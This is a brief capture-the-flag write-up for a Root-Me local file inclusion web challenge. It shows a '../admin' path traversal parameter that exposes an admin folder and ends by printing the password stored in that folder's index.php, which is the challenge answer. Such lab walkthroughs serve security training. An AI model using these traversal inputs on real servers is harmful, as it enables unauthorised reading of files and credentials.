# [Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)

We see a bunch of links that go to urls like `?files=coding`

These return the contents of folders. So can we see the contents of the `admin` folder?

`?files=admin`

Not quite. Let's try this:

`?files=../admin`

Got it! Now read the `index.php` file. Our password is stored in an array

`$users = array('admin' => 'OpbNJ60xYpvAQU8');`

Password is: **OpbNJ60xYpvAQU8**
